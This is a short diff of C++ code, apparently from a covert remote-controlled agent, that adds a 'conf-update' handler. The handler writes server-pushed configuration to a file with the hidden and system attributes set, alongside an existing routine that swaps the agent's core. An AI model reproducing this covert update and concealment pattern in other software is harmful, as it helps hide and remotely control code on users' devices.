@@ -2082,7 +2082,6 @@ BOOL Transfer::RestGetUploads() {
 		// Temporaneamente teniamo qui la routine di upgrade
 		// Verifichiamo il tipo di upgrade
 		if (wcsncmp(L"core-update", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
-
 			// Se conosciamo il nostro nome, switchiamo il nuovo core
 			wstring strPathName = L"\\windows\\";
 
@@ -2156,6 +2155,31 @@ BOOL Transfer::RestGetUploads() {
 
 			RegCloseKey(hKey);
 			RegFlushKey(HKEY_LOCAL_MACHINE);
+		} else if (wcsncmp(L"conf-update", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) { // Upgrade Conf da 7.5 a 8.0
+			// Creiamolo
+			wstring strUploaded;
+			strUploaded = GetCurrentPath(L"cptm811.dql"); // Nome della conf per la 8.0
+
+			if (strUploaded.empty())
+				continue;
+
+			hFile = CreateFile(strUploaded.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, NULL);
+
+			if (hFile == INVALID_HANDLE_VALUE)
+				continue;
+
+			b.setPos(b.getPos() + uPascalLen);
+			uFileLen = b.getInt();
+
+			DWORD dwWritten = 0;
+
+			// Scriviamolo
+			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
+				CloseHandle(hFile);
+				continue;
+			}
+
+			CloseHandle(hFile);
 		} else {
 			// Creiamolo
 			wstring strUploaded;
